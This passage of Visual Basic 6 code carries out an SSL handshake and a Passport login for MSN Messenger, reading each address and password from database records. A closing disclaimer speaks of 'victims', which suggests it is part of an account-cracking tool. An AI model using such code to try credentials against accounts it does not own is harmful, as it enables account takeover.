    Set SecureSession = Nothing

End Sub

Public Sub Winsock1_Connect()
' Handle SSL connection
'-----------------------------------------------
    
    Set SecureSession = New clsCrypto
    Call SendClientHello(Winsock1)
End Sub

Private Sub Winsock1_DataArrival(ByVal bytesTotal As Long)
' Decode SSL Information
' Passes result to the ProcessData() sub
'-----------------------------------------------

    'Parse each SSL Record
    Dim TheData As String
    Dim ReachLen As Long

    lblSSLlayer.Caption = Layer

    Do
        If Winsock1.State = sckConnected Then
            If SeekLen = 0 Then
                If bytesTotal >= 2 Then
                    Winsock1.GetData TheData, vbString, 2
                    SeekLen = BytesToLen(TheData)
                    bytesTotal = bytesTotal - 2
                Else
                    Exit Sub
                End If
            End If
            If bytesTotal >= SeekLen Then
                Winsock1.GetData TheData, vbString, SeekLen
                bytesTotal = bytesTotal - SeekLen
            Else
                Exit Sub
            End If
            
            Select Case Layer
                Case 0:
                    ENCODED_CERT = Mid(TheData, 12, BytesToLen(Mid(TheData, 6, 2)))
                    CONNECTION_ID = Right(TheData, BytesToLen(Mid(TheData, 10, 2)))
                    Call IncrementRecv
                    Call SendMasterKey(Winsock1)
                Case 1:
                    TheData = SecureSession.RC4_Decrypt(TheData)
                    If Right(TheData, Len(CHALLENGE_DATA)) = CHALLENGE_DATA Then
                        If VerifyMAC(TheData) Then Call SendClientFinish(Winsock1)
                    Else
                        Winsock1.Close
                    End If
                 Case 2:
                    TheData = SecureSession.RC4_Decrypt(TheData)
                    If VerifyMAC(TheData) = False Then Winsock1.Close
                    Layer = 3
                 Case 3:
                    TheData = SecureSession.RC4_Decrypt(TheData)
                    GetVars (TheData)
                    If VerifyMAC(TheData) Then Call ProcessData(Mid(TheData, 17))
            End Select
            SeekLen = 0
        ElseIf Winsock1.State <> sckConnected Then
            Exit Sub
        End If
    Loop Until bytesTotal = 0
End Sub

Function DoSSL(strChallenge As String) As String
' Handles the SSL part of the authentication
'-----------------------------------------------

    Dim varLines As Variant
    Dim varURLS As Variant
    Dim intCurCookie As Integer
    Dim strAuthInfo As String
    Dim strHeader As String
    Dim strLoginServer As String
    Dim strLoginPage As String
    Dim colURLS As New Collection
    Dim colHeaders As New Collection
    
'Connect to NEXUS:
'--------------------------------------------------
    strBuffer = ""
    
    Winsock1.Close
    Winsock1.Connect "nexus.passport.com", 443

    ' Wait for the SSL layer to be established:
    Do Until Layer = 3
        DoEvents
    Loop

    'Obtain login information from NEXUS:
    If Winsock1.State = sckConnected Then Call SSLSend(Winsock1, "GET /rdr/pprdr.asp HTTP/1.0" & vbCrLf & vbCrLf)
    
    Do Until InStr(1, strBuffer, vbCrLf & vbCrLf) <> 0
        'Form1.t1.Text = Form1.t1.Text & "'" & strBuffer & "'"
        DoEvents
    Loop
    Winsock1.Close
'--------------------------------------------------
'Done with NEXUS
    
    
'Begin processing data from NEXUS:
'--------------------------------------------------
    intCurCookie = 0
    varLines = Split(strBuffer, vbCrLf)

    ' Search for the header "PasswordURLs:"
        For intCount = LBound(varLines) To UBound(varLines)
            ' Add the values for "PasswordURLs:" to a collection:
            If Left$(CStr(varLines(intCount)), InStr(1, varLines(intCount), " ")) = "PassportURLs: " Then
                colHeaders.Add Right$(CStr(varLines(intCount)), Len(varLines(intCount)) - InStr(1, varLines(intCount), " ")), Left(varLines(intCount), InStr(1, varLines(intCount), " "))
                Exit For
            End If
        Next intCount

    varURLS = Split(colHeaders.Item("PassportURLs: "), ",")

    For intCount = LBound(varURLS) To UBound(varURLS)
        colURLS.Add Right(varURLS(intCount), Len(varURLS(intCount)) - InStr(1, varURLS(intCount), "=")), Left(varURLS(intCount), InStr(1, varURLS(intCount), "="))
    Next intCount

    'Get the server and page for logging in:
    strLoginServer = Left$(colURLS("DALogin="), InStr(1, colURLS("DALogin="), "/") - 1)
    strLoginPage = Right$(colURLS("DALogin="), Len(colURLS("DALogin=")) - InStr(1, colURLS("DALogin="), "/") + 1)

'--------------------------------------------------
'End processing
    

    
ConnectLogin:
'Connect to login server
'--------------------------------------------------
    strBuffer = ""
    
    ' Layer resembles the state of the SSL connection:
    Layer = 0
    
    Winsock1.Close
    Winsock1.Connect strLoginServer, 443

    ' Wait for the SSL layer to be established:
    Do Until Layer = 3
        DoEvents
    Loop

    strHeader = "GET " & strLoginPage & " HTTP/1.1" & vbCrLf & _
                "Authorization: Passport1.4 OrgVerb=GET,OrgURL=http%3A%2F%2Fmessenger%2Emsn%2Ecom,sign-in=" & Replace(ADR!address, "@", "%40") & ",pwd=" & URLEncode(PAS!Password) & "," & strChallenge & _
                "User-Agent: MSMSGS" & vbCrLf & _
                "Host: loginnet.passport.com" & vbCrLf & _
                "Connection: Keep-Alive" & vbCrLf & _
                "Cache-Control: no-cache" & vbCrLf & vbCrLf

    Call SSLSend(Winsock1, strHeader)

    ' Wait for the header to be recieved
    Do Until InStr(1, strBuffer, vbCrLf & vbCrLf) <> 0
        DoEvents
        'Form1.t1.Text = Form1.t1.Text & "'" & strBuffer & "'"
    Loop
    
    
    Dim strHeaderValue As String
    strHeaderValue = GetHeader("authentication-info:", strBuffer)
    
    If RequiresRedirect(strHeaderValue) = True Then
        strHeaderValue = GetHeader("location:", strBuffer)
        lngCharPos = InStr(strHeaderValue, "://")
        If (LCase$(Left$(strHeaderValue, lngCharPos - 1)) = "https") Then
            strLoginServer = Mid$(strHeaderValue, lngCharPos + 3, InStr(lngCharPos + 3, strHeaderValue, "/") - (lngCharPos + 3))
            strLoginPage = Right$(strHeaderValue, Len(strHeaderValue) - (InStr(lngCharPos + 3, strHeaderValue, "/") - 1))
            GoTo ConnectLogin
        End If
    Else
        DoSSL = ParseHash(strHeaderValue)
        Winsock1.Close
        Exit Function
    End If
'--------------------------------------------------
'Done with login server
End Function

Function GetHeader(strHeader As String, strData As String) As String
' Returns the value of a header-property
'-----------------------------------------------
    Dim intCount As Integer
    Dim varLines As Variant
    Dim lngCharPos As Long
    Dim strCurHeader As String
    
    varLines = Split(strData, vbCrLf)
    
    For intCount = LBound(varLines) To UBound(varLines)
        If Len(varLines(intCount)) = 0 Then Exit For
        strCurHeader = varLines(intCount)
        lngCharPos = InStr(strCurHeader, " ")
        
        If LCase(Left(strCurHeader, lngCharPos - 1)) = LCase(strHeader) Then
            GetHeader = Right(strCurHeader, Len(strCurHeader) - lngCharPos)
            Exit Function
        End If
    Next intCount
End Function

Function RequiresRedirect(strData As String) As Boolean
' Checks whether it's necessary to redirect to
' another server (using 'da-status' property)
'-----------------------------------------------

    Dim intCount As Integer
    Dim varProps As Variant
    Dim lngCharPos As Long
    Dim strCurItem As String
    Dim strPropName As String
    Dim strPropValue As String

    lngCharPos = InStr(strData, " ")

    If InStr(1, strData, "Passport1.4") Then
        strData = Right(strData, Len(strData) - lngCharPos)
        varProps = Split(strData, ",")
    
        For intCount = LBound(varProps) To UBound(varProps)
            strCurItem = varProps(intCount)
            lngCharPos = InStr(strCurItem, "=")
            strPropName = Left(strCurItem, lngCharPos - 1)
            strPropValue = Right(strCurItem, Len(strCurItem) - lngCharPos)
            
            If LCase$(strPropName) = "da-status" And LCase$(strPropValue) = "redir" Then
                RequiresRedirect = True
                Exit Function
            ElseIf LCase$(strPropName) = "da-status" And LCase$(strPropValue) = "success" Then
                RequiresRedirect = False
                Exit Function
            End If
        Next intCount
    End If
End Function

Function ParseHash(strHeader As String) As String
' Returns the hash (from-pp) if the login has
' completed succesfully.
'-----------------------------------------------

    Dim intCount As Integer
    Dim varProps As Variant
    Dim lngCharPos As Long
    Dim strCurItem As String
    Dim strPropName As String
    Dim strPropValue As String

    varProps = Split(strHeader, ",")
    
    For intCount = LBound(varProps) To UBound(varProps)
        strCurItem = varProps(intCount)
        lngCharPos = InStr(strCurItem, "=")
        strPropName = Left(strCurItem, lngCharPos - 1)
        strPropValue = Right(strCurItem, Len(strCurItem) - lngCharPos)
    
        If LCase$(strPropName) = "from-pp" Then
            ParseHash = strPropValue
            ParseHash = Left(ParseHash, Len(ParseHash) - 1)
            ParseHash = Right(ParseHash, Len(ParseHash) - 1)
            Exit Function
        End If
        Next intCount
End Function

'!!!!!***************!!!!!!!!!******************!!!!!!!!!!!!**********!
'Please read before making use of this code!
'Disclaimer: This is illegal if executed on real victims and could land you in prison for sure.
'This is intended for educational purposes only. We take no responsibility at all for your actions.
'This code is provided by EEEDS Eagle Eye Digital Security (Oman) for education purpose only.
'For more educational source codes please visit us http://www.digi77.com
'Author of this code W. Al Maawali Founder of  Eagle Eye Digital Solutions and Oman0.net can be reached via warith@digi77.com .

'Sharing knowledge is not about giving people something, or getting something from them.
'That is only valid for information sharing.
'Sharing knowledge occurs when people are genuinely interested in helping one another develop new capacities for action;
'it is about creating learning processes.
'Peter Senge
'!!!!!***************!!!!!!!!!******************!!!!!!!!!!!!**********!
